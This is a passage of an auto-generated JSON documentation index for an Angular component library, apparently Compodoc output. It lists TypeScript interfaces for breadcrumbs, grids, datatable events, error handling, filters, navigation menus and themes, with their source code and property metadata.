            "file": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
            "type": "interface",
            "sourceCode": "import { EventEmitter, InjectionToken } from '@angular/core';\n\nexport interface Breadcrumb {\n  label: string;\n  command?: (...args: Array<unknown>) => void;\n  segment?: string;\n  disabled?: boolean;\n  eventEmitter?: EventEmitter<unknown>;\n  url?: string;\n}\n\nexport interface BreadcrumbConfig { icon?: string; svgIcon?: string; text?: string };\n\nexport const NAVIGATION_HOME_ICON = new InjectionToken<BreadcrumbConfig>('sto-home-icon');\n",
            "properties": [
                {
                    "name": "command",
                    "type": "function",
                    "optional": true,
                    "description": "",
                    "line": 5
                },
                {
                    "name": "disabled",
                    "type": "boolean",
                    "optional": true,
                    "description": "",
                    "line": 7
                },
                {
                    "name": "eventEmitter",
                    "type": "EventEmitter<unknown>",
                    "optional": true,
                    "description": "",
                    "line": 8
                },
                {
                    "name": "label",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 4
                },
                {
                    "name": "segment",
                    "type": "string",
                    "optional": true,
                    "description": "",
                    "line": 6
                },
                {
                    "name": "url",
                    "type": "string",
                    "optional": true,
                    "description": "",
                    "line": 9
                }
            ],
            "indexSignatures": [],
            "kind": 150,
            "methods": []
        },
        {
            "name": "BreadcrumbConfig",
            "id": "interface-BreadcrumbConfig-3ecfdc0e9b2e66a118b38fb7589645e0",
            "file": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
            "type": "interface",
            "sourceCode": "import { EventEmitter, InjectionToken } from '@angular/core';\n\nexport interface Breadcrumb {\n  label: string;\n  command?: (...args: Array<unknown>) => void;\n  segment?: string;\n  disabled?: boolean;\n  eventEmitter?: EventEmitter<unknown>;\n  url?: string;\n}\n\nexport interface BreadcrumbConfig { icon?: string; svgIcon?: string; text?: string };\n\nexport const NAVIGATION_HOME_ICON = new InjectionToken<BreadcrumbConfig>('sto-home-icon');\n",
            "properties": [
                {
                    "name": "icon",
                    "type": "string",
                    "optional": true,
                    "description": "",
                    "line": 12
                },
                {
                    "name": "svgIcon",
                    "type": "string",
                    "optional": true,
                    "description": "",
                    "line": 12
                },
                {
                    "name": "text",
                    "type": "string",
                    "optional": true,
                    "description": "",
                    "line": 12
                }
            ],
            "indexSignatures": [],
            "kind": 150,
            "methods": []
        },
        {
            "name": "BreakpointConfig",
            "id": "interface-BreakpointConfig-1da8b73f34653bf1105c001fb79038c2",
            "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
            "type": "interface",
            "sourceCode": "import { AfterViewInit, ContentChildren, Directive, ElementRef, HostBinding, Input, OnDestroy, QueryList } from '@angular/core';\n\ninterface BreakpointConfig {\n  2: number;\n  4: number;\n}\n\nconst getClass = (width: number, small = 400, large = 800) => {\n  let cols = 1;\n  if ( width > small ) {\n    cols += 1;\n  }\n  if ( width > large ) {\n    cols += 2;\n  }\n  return `sto-f-grid--${cols}`;\n};\n\nconst ALL_GRIDS = [ 'sto-f-grid--1', 'sto-f-grid--2', 'sto-f-grid--4', 'sto-f-grid--6' ];\n\n@Directive({ selector: '[stoGridSpacer]' })\nexport class StoGridSpacerDirective {\n  @HostBinding('class.sto-f-grid__col')\n  @HostBinding('class.sto-f-grid__col--spacer')\n  useClass = true;\n}\n\n@Directive({ selector: '[stoGridColumn]' })\nexport class StoGridColumnDirective {\n  @HostBinding('class.sto-f-grid__col')\n  useClass = true;\n  @HostBinding('class.sto-f-grid__col--2')\n  @Input()\n  stoGridColumnDouble: boolean;\n\n}\n\n@Directive({\n  selector: '[stoGrid]',\n  exportAs: 'stoGrid'\n})\nexport class StoGridDirective implements AfterViewInit, OnDestroy {\n  @HostBinding('style.max-width.px')\n  @Input()\n  maxWidth = 1000;\n  @HostBinding('style.min-width.px')\n  @Input()\n  minWidth = 250;\n  @HostBinding('class.sto-f-grid')\n  baseClass = true;\n  @ContentChildren(StoGridColumnDirective, { read: ElementRef })\n  columns: QueryList<ElementRef<HTMLElement>>;\n  @Input()\n  breakpoints: BreakpointConfig;\n\n  private observer: ResizeObserver;\n\n  constructor(\n    private elRef: ElementRef<HTMLElement>,\n  ) {\n  }\n\n  ngAfterViewInit() {\n    const el = this.elRef.nativeElement as HTMLElement;\n    this.observer = new ResizeObserver(entries => {\n      for ( const entry of entries ) {\n        const cr = entry.contentRect;\n        const { width } = cr;\n        const breakpoints = this.breakpoints || { 2: 400, 4: 800 };\n        const gridType = getClass(width, breakpoints[ 2 ], breakpoints[ 4 ]);\n        if ( !el.classList.contains(gridType) ) {\n          el.classList.remove(...ALL_GRIDS);\n          el.classList.add(gridType);\n        }\n      }\n    });\n    this.observer.observe(this.elRef.nativeElement);\n  }\n\n  ngOnDestroy() {\n    if ( this.observer ) {\n      this.observer.disconnect();\n    }\n  }\n\n}\n\n",
            "properties": [
                {
                    "name": "2",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 4
                },
                {
                    "name": "4",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 5
                }
            ],
            "indexSignatures": [],
            "kind": 150,
            "methods": []
        },
        {
            "name": "Chainable",
            "id": "interface-Chainable-18a4949074175452550ac7042867edc2",
            "file": "apps/oilmod-web-e2e/src/support/commands.ts",
            "type": "interface",
            "sourceCode": "declare namespace Cypress {\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\n  interface Chainable<Subject> {\n    login(email: string, password: string): void;\n  }\n}\n//\n// -- This is a parent command --\nCypress.Commands.add('login', (email, password) => {\n  console.log('Custom command example: Login', email, password);\n});\n//\n// -- This is a child command --\n// Cypress.Commands.add(\"drag\", { prevSubject: 'element'}, (subject, options) => { ... })\n//\n//\n// -- This is a dual command --\n// Cypress.Commands.add(\"dismiss\", { prevSubject: 'optional'}, (subject, options) => { ... })\n//\n//\n// -- This will overwrite an existing command --\n// Cypress.Commands.overwrite(\"visit\", (originalFn, url, options) => { ... })\n",
            "properties": [],
            "indexSignatures": [],
            "kind": 152,
            "methods": [
                {
                    "name": "login",
                    "args": [
                        {
                            "name": "email",
                            "type": "string"
                        },
                        {
                            "name": "password",
                            "type": "string"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 15,
                    "jsdoctags": [
                        {
                            "name": "email",
                            "type": "string",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "password",
                            "type": "string",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ]
        },
        {
            "name": "ContextMenu",
            "id": "interface-ContextMenu-b1081c105e790e2ebf637d6f7680b8ab",
            "file": "libs/datatable/src/lib/sto-datatable/events.ts",
            "type": "interface",
            "sourceCode": "import { Column } from './columns';\n\nexport interface ContextMenu {\n  event: MouseEvent | KeyboardEvent;\n  column: Column;\n}\n\ninterface RowCtx<T extends Record<string, unknown>> {\n  row: T;\n  index: number;\n}\n\nexport type RowContextMenu<T extends Record<string, unknown>> = ContextMenu & RowCtx<T>;\nexport type HeaderContextMenu = ContextMenu;\n\ninterface Activate<T extends Record<string, unknown>> {\n  row: T;\n  event: MouseEvent | KeyboardEvent;\n  index: number;\n  rowEl?: HTMLDivElement;\n}\n\nexport interface RowSelection<T extends Record<string, unknown>> extends Activate<T> {\n  event: MouseEvent | KeyboardEvent;\n}\n\nexport interface RowActivation<T extends Record<string, unknown>> extends Activate<T> {\n  event: KeyboardEvent;\n}\n",
            "properties": [
                {
                    "name": "column",
                    "type": "Column",
                    "optional": false,
                    "description": "",
                    "line": 5
                },
                {
                    "name": "event",
                    "type": "MouseEvent | KeyboardEvent",
                    "optional": false,
                    "description": "",
                    "line": 4
                }
            ],
            "indexSignatures": [],
            "kind": 150,
            "methods": []
        },
        {
            "name": "ErrorHandler",
            "id": "interface-ErrorHandler-b6d5d469e07c74d46bfa7ecf3231d115",
            "file": "libs/error-handler/src/lib/error-handler/error-handler.ts",
            "type": "interface",
            "sourceCode": "import { HttpErrorResponse } from '@angular/common/http';\nimport { HttpError } from './http-error';\n\n/**\n * Public interface for the error handler class.\n */\nexport interface StoErrorHandler {\n  [ code: number ]: Handler;\n\n  getErrorText?: (err: HttpErrorResponse) => string;\n}\n\n/**\n * Internal interface for our errorhandler.\n */\nexport interface ErrorHandler extends StoErrorHandler {\n  handler: (err: HttpErrorResponse, handler?: Handler) => void;\n  defaultHandler: Handler;\n}\n\n/**\n * Interface for the ErrorLogger injection token.\n */\nexport interface ErrorLogger {\n  log: (arg0: HttpError) => void;\n}\n\n// Expected signature for error handlers.\nexport type Handler = (err: HttpErrorResponse) => HttpError;\n\n",
            "properties": [
                {
                    "name": "defaultHandler",
                    "type": "Handler",
                    "optional": false,
                    "description": "",
                    "line": 18
                },
                {
                    "name": "handler",
                    "type": "function",
                    "optional": false,
                    "description": "",
                    "line": 17
                }
            ],
            "indexSignatures": [],
            "kind": 150,
            "description": "<p>Internal interface for our errorhandler.</p>\n",
            "methods": [],
            "extends": "StoErrorHandler"
        },
        {
            "name": "ErrorLogger",
            "id": "interface-ErrorLogger-b6d5d469e07c74d46bfa7ecf3231d115",
            "file": "libs/error-handler/src/lib/error-handler/error-handler.ts",
            "type": "interface",
            "sourceCode": "import { HttpErrorResponse } from '@angular/common/http';\nimport { HttpError } from './http-error';\n\n/**\n * Public interface for the error handler class.\n */\nexport interface StoErrorHandler {\n  [ code: number ]: Handler;\n\n  getErrorText?: (err: HttpErrorResponse) => string;\n}\n\n/**\n * Internal interface for our errorhandler.\n */\nexport interface ErrorHandler extends StoErrorHandler {\n  handler: (err: HttpErrorResponse, handler?: Handler) => void;\n  defaultHandler: Handler;\n}\n\n/**\n * Interface for the ErrorLogger injection token.\n */\nexport interface ErrorLogger {\n  log: (arg0: HttpError) => void;\n}\n\n// Expected signature for error handlers.\nexport type Handler = (err: HttpErrorResponse) => HttpError;\n\n",
            "properties": [
                {
                    "name": "log",
                    "type": "function",
                    "optional": false,
                    "description": "",
                    "line": 25
                }
            ],
            "indexSignatures": [],
            "kind": 150,
            "description": "<p>Interface for the ErrorLogger injection token.</p>\n",
            "methods": []
        },
        {
            "name": "FilterList",
            "id": "interface-FilterList-98a3fa4ec561b72429c91d53dbb4c423",
            "file": "libs/common/src/lib/sto-filter/filter.ts",
            "type": "interface",
            "sourceCode": "import { FormBuilder, FormGroup } from '@angular/forms';\nimport { EventEmitter, Input, OnDestroy, OnInit, Output, Directive } from '@angular/core';\nimport { Observable, OperatorFunction, Subject } from 'rxjs';\nimport { debounceTime, startWith, takeUntil } from 'rxjs/operators';\n\nexport interface FilterList {\n  key: string;\n  value: string;\n  index?: number;\n}\n\n/**\n * Abstract class utilized to decrease boiler plate for filters.\n * Given that most filters are identical in their base setup (a reactive form, using sto-filter-panel etc), this simplify writing filters.\n * It also allows you to have filter chips in your filter title with a base implementation (only needs a formConfig & serializer fn)\n */\n@Directive()\nexport abstract class FilterForm<T extends Record<string, unknown>> implements OnInit, OnDestroy {\n  // FormBuilder config\n  abstract formConfig: { [ key: string ]: unknown };\n  // Serializer function\n  abstract serializer: OperatorFunction<T, FilterList[]>;\n  protected destroyed$ = new Subject();\n  // Most filters will emit a filterChanged event\n  @Output()\n  filterChanged = new EventEmitter<T>();\n  // Initial value of the filter\n  @Input()\n  value: T;\n\n  // Form group\n  public form: FormGroup;\n  // Chip value. See {@link FilterList}\n  public filter$: Observable<FilterList[]>;\n\n  constructor(private fb: FormBuilder) {\n  }\n\n  ngOnInit() {\n    this.form = this.fb.group(this.formConfig);\n    this.form.reset(this.value || {});\n    this.filter$ = this.form\n      .valueChanges\n      .pipe(startWith<T>(this.form.value), this.serializer);\n    this.form.valueChanges\n      .pipe(\n        startWith(this.form.value),\n        debounceTime(250),\n        takeUntil(this.destroyed$)\n      ).subscribe(value => this.filterChanged.emit(value));\n  }\n\n  ngOnDestroy() {\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n  }\n\n  /**\n   * This function clears the value for the given key.\n   * If index is passed in, it assumes the value for the key is an array, and removes the value at the given index.\n   * @param key\n   * @param index\n   */\n  public clearFilter(key: string, index?: number) {\n    if ( index || index === 0 ) {\n      const val = [...(this.form.get(key)?.value ?? [])];\n      val.splice(index, 1);\n      this.form.get(key)?.reset(val);\n    } else {\n      this.form.get(key)?.reset();\n    }\n  }\n\n  // Util function to resize tables. Looking to get rid of this...\n  public toggled() {\n    setTimeout(() => window.dispatchEvent(new Event('resize')), 300);\n  }\n\n}\n",
            "properties": [
                {
                    "name": "index",
                    "type": "number",
                    "optional": true,
                    "description": "",
                    "line": 9
                },
                {
                    "name": "key",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 7
                },
                {
                    "name": "value",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 8
                }
            ],
            "indexSignatures": [],
            "kind": 150,
            "methods": []
        },
        {
            "name": "MenuGroup",
            "id": "interface-MenuGroup-7b698b09cacac82504f8fe89b83829f5",
            "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
            "type": "interface",
            "sourceCode": "export type Menu = {\n  groups: MenuGroup[];\n} & Record<string, unknown>;\n\nexport interface MenuGroup {\n  hasDivider?: boolean;\n  icon?: string;\n  svgIcon?: boolean;\n  items: MenuItem[];\n  name?: string;\n}\n\nexport interface MenuItem {\n  id?: string;\n  name?: string;\n  icon?: string;\n  svgIcon?: boolean;\n  command?: MenuItemCommand;\n  error?: string;\n}\n\nexport interface MenuItemCommand {\n  type: MenuItemTypes;\n  /**\n   * For internal urls: RouterCommands.\n   * For external urls, should just be array with one element (the full url)\n   */\n  arguments: Array<string | number>;\n}\n\nexport interface NavigateCommand {\n  $event: MouseEvent | KeyboardEvent;\n  command?: Array<string | number>;\n}\n\nexport enum MenuItemTypes {\n  External = 'externalLink',\n  ExternalNew = 'externalLinkNewWindow',\n  Internal = 'internalLink',\n  Navigate = 'navigate'\n}\n",
            "properties": [
                {
                    "name": "hasDivider",
                    "type": "boolean",
                    "optional": true,
                    "description": "",
                    "line": 6
                },
                {
                    "name": "icon",
                    "type": "string",
                    "optional": true,
                    "description": "",
                    "line": 7
                },
                {
                    "name": "items",
                    "type": "MenuItem[]",
                    "optional": false,
                    "description": "",
                    "line": 9
                },
                {
                    "name": "name",
                    "type": "string",
                    "optional": true,
                    "description": "",
                    "line": 10
                },
                {
                    "name": "svgIcon",
                    "type": "boolean",
                    "optional": true,
                    "description": "",
                    "line": 8
                }
            ],
            "indexSignatures": [],
            "kind": 150,
            "methods": []
        },
        {
            "name": "MenuItem",
            "id": "interface-MenuItem-7b698b09cacac82504f8fe89b83829f5",
            "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
            "type": "interface",
            "sourceCode": "export type Menu = {\n  groups: MenuGroup[];\n} & Record<string, unknown>;\n\nexport interface MenuGroup {\n  hasDivider?: boolean;\n  icon?: string;\n  svgIcon?: boolean;\n  items: MenuItem[];\n  name?: string;\n}\n\nexport interface MenuItem {\n  id?: string;\n  name?: string;\n  icon?: string;\n  svgIcon?: boolean;\n  command?: MenuItemCommand;\n  error?: string;\n}\n\nexport interface MenuItemCommand {\n  type: MenuItemTypes;\n  /**\n   * For internal urls: RouterCommands.\n   * For external urls, should just be array with one element (the full url)\n   */\n  arguments: Array<string | number>;\n}\n\nexport interface NavigateCommand {\n  $event: MouseEvent | KeyboardEvent;\n  command?: Array<string | number>;\n}\n\nexport enum MenuItemTypes {\n  External = 'externalLink',\n  ExternalNew = 'externalLinkNewWindow',\n  Internal = 'internalLink',\n  Navigate = 'navigate'\n}\n",
            "properties": [
                {
                    "name": "command",
                    "type": "MenuItemCommand",
                    "optional": true,
                    "description": "",
                    "line": 18
                },
                {
                    "name": "error",
                    "type": "string",
                    "optional": true,
                    "description": "",
                    "line": 19
                },
                {
                    "name": "icon",
                    "type": "string",
                    "optional": true,
                    "description": "",
                    "line": 16
                },
                {
                    "name": "id",
                    "type": "string",
                    "optional": true,
                    "description": "",
                    "line": 14
                },
                {
                    "name": "name",
                    "type": "string",
                    "optional": true,
                    "description": "",
                    "line": 15
                },
                {
                    "name": "svgIcon",
                    "type": "boolean",
                    "optional": true,
                    "description": "",
                    "line": 17
                }
            ],
            "indexSignatures": [],
            "kind": 150,
            "methods": []
        },
        {
            "name": "MenuItemCommand",
            "id": "interface-MenuItemCommand-7b698b09cacac82504f8fe89b83829f5",
            "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
            "type": "interface",
            "sourceCode": "export type Menu = {\n  groups: MenuGroup[];\n} & Record<string, unknown>;\n\nexport interface MenuGroup {\n  hasDivider?: boolean;\n  icon?: string;\n  svgIcon?: boolean;\n  items: MenuItem[];\n  name?: string;\n}\n\nexport interface MenuItem {\n  id?: string;\n  name?: string;\n  icon?: string;\n  svgIcon?: boolean;\n  command?: MenuItemCommand;\n  error?: string;\n}\n\nexport interface MenuItemCommand {\n  type: MenuItemTypes;\n  /**\n   * For internal urls: RouterCommands.\n   * For external urls, should just be array with one element (the full url)\n   */\n  arguments: Array<string | number>;\n}\n\nexport interface NavigateCommand {\n  $event: MouseEvent | KeyboardEvent;\n  command?: Array<string | number>;\n}\n\nexport enum MenuItemTypes {\n  External = 'externalLink',\n  ExternalNew = 'externalLinkNewWindow',\n  Internal = 'internalLink',\n  Navigate = 'navigate'\n}\n",
            "properties": [
                {
                    "name": "arguments",
                    "type": "Array<string | number>",
                    "optional": false,
                    "description": "<p>For internal urls: RouterCommands.\nFor external urls, should just be array with one element (the full url)</p>\n",
                    "line": 28
                },
                {
                    "name": "type",
                    "type": "MenuItemTypes",
                    "optional": false,
                    "description": "",
                    "line": 23
                }
            ],
            "indexSignatures": [],
            "kind": 150,
            "methods": []
        },
        {
            "name": "NavigateCommand",
            "id": "interface-NavigateCommand-7b698b09cacac82504f8fe89b83829f5",
            "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
            "type": "interface",
            "sourceCode": "export type Menu = {\n  groups: MenuGroup[];\n} & Record<string, unknown>;\n\nexport interface MenuGroup {\n  hasDivider?: boolean;\n  icon?: string;\n  svgIcon?: boolean;\n  items: MenuItem[];\n  name?: string;\n}\n\nexport interface MenuItem {\n  id?: string;\n  name?: string;\n  icon?: string;\n  svgIcon?: boolean;\n  command?: MenuItemCommand;\n  error?: string;\n}\n\nexport interface MenuItemCommand {\n  type: MenuItemTypes;\n  /**\n   * For internal urls: RouterCommands.\n   * For external urls, should just be array with one element (the full url)\n   */\n  arguments: Array<string | number>;\n}\n\nexport interface NavigateCommand {\n  $event: MouseEvent | KeyboardEvent;\n  command?: Array<string | number>;\n}\n\nexport enum MenuItemTypes {\n  External = 'externalLink',\n  ExternalNew = 'externalLinkNewWindow',\n  Internal = 'internalLink',\n  Navigate = 'navigate'\n}\n",
            "properties": [
                {
                    "name": "$event",
                    "type": "MouseEvent | KeyboardEvent",
                    "optional": false,
                    "description": "",
                    "line": 32
                },
                {
                    "name": "command",
                    "type": "Array<string | number>",
                    "optional": true,
                    "description": "",
                    "line": 33
                }
            ],
            "indexSignatures": [],
            "kind": 150,
            "methods": []
        },
        {
            "name": "RowActivation",
            "id": "interface-RowActivation-b1081c105e790e2ebf637d6f7680b8ab",
            "file": "libs/datatable/src/lib/sto-datatable/events.ts",
            "type": "interface",
            "sourceCode": "import { Column } from './columns';\n\nexport interface ContextMenu {\n  event: MouseEvent | KeyboardEvent;\n  column: Column;\n}\n\ninterface RowCtx<T extends Record<string, unknown>> {\n  row: T;\n  index: number;\n}\n\nexport type RowContextMenu<T extends Record<string, unknown>> = ContextMenu & RowCtx<T>;\nexport type HeaderContextMenu = ContextMenu;\n\ninterface Activate<T extends Record<string, unknown>> {\n  row: T;\n  event: MouseEvent | KeyboardEvent;\n  index: number;\n  rowEl?: HTMLDivElement;\n}\n\nexport interface RowSelection<T extends Record<string, unknown>> extends Activate<T> {\n  event: MouseEvent | KeyboardEvent;\n}\n\nexport interface RowActivation<T extends Record<string, unknown>> extends Activate<T> {\n  event: KeyboardEvent;\n}\n",
            "properties": [
                {
                    "name": "event",
                    "type": "KeyboardEvent",
                    "optional": false,
                    "description": "",
                    "line": 28
                }
            ],
            "indexSignatures": [],
            "kind": 150,
            "methods": [],
            "extends": "Activate"
        },
        {
            "name": "RowCtx",
            "id": "interface-RowCtx-b1081c105e790e2ebf637d6f7680b8ab",
            "file": "libs/datatable/src/lib/sto-datatable/events.ts",
            "type": "interface",
            "sourceCode": "import { Column } from './columns';\n\nexport interface ContextMenu {\n  event: MouseEvent | KeyboardEvent;\n  column: Column;\n}\n\ninterface RowCtx<T extends Record<string, unknown>> {\n  row: T;\n  index: number;\n}\n\nexport type RowContextMenu<T extends Record<string, unknown>> = ContextMenu & RowCtx<T>;\nexport type HeaderContextMenu = ContextMenu;\n\ninterface Activate<T extends Record<string, unknown>> {\n  row: T;\n  event: MouseEvent | KeyboardEvent;\n  index: number;\n  rowEl?: HTMLDivElement;\n}\n\nexport interface RowSelection<T extends Record<string, unknown>> extends Activate<T> {\n  event: MouseEvent | KeyboardEvent;\n}\n\nexport interface RowActivation<T extends Record<string, unknown>> extends Activate<T> {\n  event: KeyboardEvent;\n}\n",
            "properties": [
                {
                    "name": "index",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 10
                },
                {
                    "name": "row",
                    "type": "T",
                    "optional": false,
                    "description": "",
                    "line": 9
                }
            ],
            "indexSignatures": [],
            "kind": 150,
            "methods": []
        },
        {
            "name": "RowSelection",
            "id": "interface-RowSelection-b1081c105e790e2ebf637d6f7680b8ab",
            "file": "libs/datatable/src/lib/sto-datatable/events.ts",
            "type": "interface",
            "sourceCode": "import { Column } from './columns';\n\nexport interface ContextMenu {\n  event: MouseEvent | KeyboardEvent;\n  column: Column;\n}\n\ninterface RowCtx<T extends Record<string, unknown>> {\n  row: T;\n  index: number;\n}\n\nexport type RowContextMenu<T extends Record<string, unknown>> = ContextMenu & RowCtx<T>;\nexport type HeaderContextMenu = ContextMenu;\n\ninterface Activate<T extends Record<string, unknown>> {\n  row: T;\n  event: MouseEvent | KeyboardEvent;\n  index: number;\n  rowEl?: HTMLDivElement;\n}\n\nexport interface RowSelection<T extends Record<string, unknown>> extends Activate<T> {\n  event: MouseEvent | KeyboardEvent;\n}\n\nexport interface RowActivation<T extends Record<string, unknown>> extends Activate<T> {\n  event: KeyboardEvent;\n}\n",
            "properties": [
                {
                    "name": "event",
                    "type": "MouseEvent | KeyboardEvent",
                    "optional": false,
                    "description": "",
                    "line": 24
                }
            ],
            "indexSignatures": [],
            "kind": 150,
            "methods": [],
            "extends": "Activate"
        },
        {
            "name": "SortColumn",
            "id": "interface-SortColumn-e5f19ed67c1635d405aefa55e401b169",
            "file": "libs/datatable/src/lib/sto-datatable/models.ts",
            "type": "interface",
            "sourceCode": "export interface SortColumn {\n  id: string;\n  sortDir: 'asc' | 'desc' | null;\n}\n\nexport type rowClassFn = <T>(row: T) => string;\n",
            "properties": [
                {
                    "name": "id",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 2
                },
                {
                    "name": "sortDir",
                    "type": "\"asc\" | \"desc\" | null",
                    "optional": false,
                    "description": "",
                    "line": 3
                }
            ],
            "indexSignatures": [],
            "kind": 150,
            "methods": []
        },
        {
            "name": "StoErrorHandler",
            "id": "interface-StoErrorHandler-b6d5d469e07c74d46bfa7ecf3231d115",
            "file": "libs/error-handler/src/lib/error-handler/error-handler.ts",
            "type": "interface",
            "sourceCode": "import { HttpErrorResponse } from '@angular/common/http';\nimport { HttpError } from './http-error';\n\n/**\n * Public interface for the error handler class.\n */\nexport interface StoErrorHandler {\n  [ code: number ]: Handler;\n\n  getErrorText?: (err: HttpErrorResponse) => string;\n}\n\n/**\n * Internal interface for our errorhandler.\n */\nexport interface ErrorHandler extends StoErrorHandler {\n  handler: (err: HttpErrorResponse, handler?: Handler) => void;\n  defaultHandler: Handler;\n}\n\n/**\n * Interface for the ErrorLogger injection token.\n */\nexport interface ErrorLogger {\n  log: (arg0: HttpError) => void;\n}\n\n// Expected signature for error handlers.\nexport type Handler = (err: HttpErrorResponse) => HttpError;\n\n",
            "properties": [
                {
                    "name": "getErrorText",
                    "type": "function",
                    "optional": true,
                    "description": "",
                    "line": 10
                }
            ],
            "indexSignatures": [
                {
                    "id": "index-declaration-b6d5d469e07c74d46bfa7ecf3231d115",
                    "args": [
                        {
                            "name": "code",
                            "type": "number"
                        }
                    ],
                    "returnType": "Handler",
                    "line": 7
                }
            ],
            "kind": 150,
            "description": "<p>Public interface for the error handler class.</p>\n",
            "methods": []
        },
        {
            "name": "ThemeModel",
            "id": "interface-ThemeModel-5b38a53c435d36a9b23432bc4fd12948",
            "file": "libs/common/src/lib/theme/models.ts",
            "type": "interface",
            "sourceCode": "export type ThemeName = 'light' | 'dark';\nexport type ThemeClassName = 'sto-light-theme' | 'sto-dark-theme';\nexport type TypographyName = 'small' | 'medium' | 'large';\nexport type TypographyClassName = 'sto-sm-typography' | 'sto-m-typography' | 'sto-l-typography';\n\nexport const themes = new Map<ThemeName, ThemeClassName>([\n  [ 'light', 'sto-light-theme' ],\n  [ 'dark', 'sto-dark-theme' ],\n]);\n\nexport const typography = new Map<TypographyName, TypographyClassName>([\n  [ 'small', 'sto-sm-typography' ],\n  [ 'medium', 'sto-m-typography' ],\n  [ 'large', 'sto-l-typography' ],\n]);\n\nexport interface ThemeModel<T = ThemeName | TypographyName> {\n  id?: string;\n  type: 'typography' | 'theme';\n  value: T;\n}\n",
            "properties": [
                {
                    "name": "id",
                    "type": "string",
                    "optional": true,
                    "description": "",
                    "line": 18
                },
                {
                    "name": "type",
                    "type": "\"typography\" | \"theme\"",
                    "optional": false,
                    "description": "",
                    "line": 19
                },
                {
                    "name": "value",
                    "type": "T",
                    "optional": false,
                    "description": "",
                    "line": 20
                }
            ],
            "indexSignatures": [],
            "kind": 150,
            "methods": []
        },
        {
            "name": "ThemeSaver",
            "id": "interface-ThemeSaver-499f06f6e31fcf94892af6aeb5c3c529",
            "file": "libs/common/src/lib/theme/theme-saver.service.ts",
            "type": "interface",
            "sourceCode": "import { Injectable, InjectionToken } from '@angular/core';\nimport { ThemeModel, ThemeName, TypographyName } from './models';\nimport { Observable, of } from 'rxjs';\n\ntype ReturnValue<T> = Promise<T> | Observable<T> | T;\n\nexport interface ThemeSaver<T = ReturnValue<ThemeModel>> {\n  save(model: ThemeModel): T;\n\n  load(type?: 'typography' | 'theme'): T;\n\n  remove?(): ReturnValue<void>;\n}\n\nexport const THEME_SAVER = new InjectionToken<ThemeSaver>('sto__theme__typo');\n\n@Injectable({ providedIn: 'root' })\nexport class ThemeSaverService implements ThemeSaver {\n  load(type: 'typography' | 'theme'): Observable<ThemeModel> {\n    let value = localStorage.getItem('tops__' + type) as TypographyName | ThemeName;\n    if ( !value ) {\n      value = type === 'typography' ? 'medium' : 'light';\n    }\n    return of({ value, type });\n  }\n\n  save(model: ThemeModel): Observable<ThemeModel> {\n    localStorage.setItem('tops__' + model.type, model.value);\n    return of(model);\n  }\n}\n",
            "properties": [],
            "indexSignatures": [],
            "kind": 152,
            "methods": [
                {
                    "name": "load",
                    "args": [
                        {
                            "name": "type",
                            "type": "\"typography\" | \"theme\"",
                            "optional": true
                        }
                    ],
                    "optional": false,
                    "returnType": "T",
                    "typeParameters": [],
                    "line": 10,
                    "jsdoctags": [
                        {
                            "name": "type",
                            "type": "\"typography\" | \"theme\"",
                            "optional": true,
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "remove",
                    "args": [],
                    "optional": true,
                    "returnType": "ReturnValue<void>",
                    "typeParameters": [],
                    "line": 12
                },
                {
                    "name": "save",
                    "args": [
                        {
                            "name": "model",
                            "type": "ThemeModel"
                        }
                    ],
                    "optional": false,
                    "returnType": "T",
                    "typeParameters": [],
                    "line": 8,
                    "jsdoctags": [
                        {
                            "name": "model",
                            "type": "ThemeModel",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ]
        }
    ],
    "injectables": [
        {
            "name": "ConfirmService",
            "id": "injectable-ConfirmService-5c83c233ce0681a7d867b2beab7d3f00",
            "file": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.service.ts",
            "properties": [
                {
                    "name": "ref",
                    "type": "MatDialogRef<ConfirmComponent> | null",
                    "optional": false,
                    "description": "",
                    "line": 9,
                    "modifierKind": [
                        114
                    ]
                }
            ],
            "methods": [
                {
                    "name": "confirm",
                    "args": [
                        {
                            "name": "message",
                            "type": "string"
                        },
                        {
                            "name": "title",
                            "type": "string",
                            "defaultValue": "'Confirm'"
                        },
                        {
                            "name": "confirmText",
                            "type": "string",
                            "defaultValue": "'OK'"
                        },
                        {
                            "name": "showCancel",
                            "type": "",
                            "defaultValue": "true"
                        }
                    ],
                    "optional": false,
                    "returnType": "Observable<boolean>",
                    "typeParameters": [],
                    "line": 14,
                    "jsdoctags": [
                        {
                            "name": "message",
                            "type": "string",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "title",
                            "type": "string",
                            "defaultValue": "'Confirm'",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "confirmText",
                            "type": "string",
                            "defaultValue": "'OK'",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "showCancel",
                            "type": "",
                            "defaultValue": "true",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "description": "",
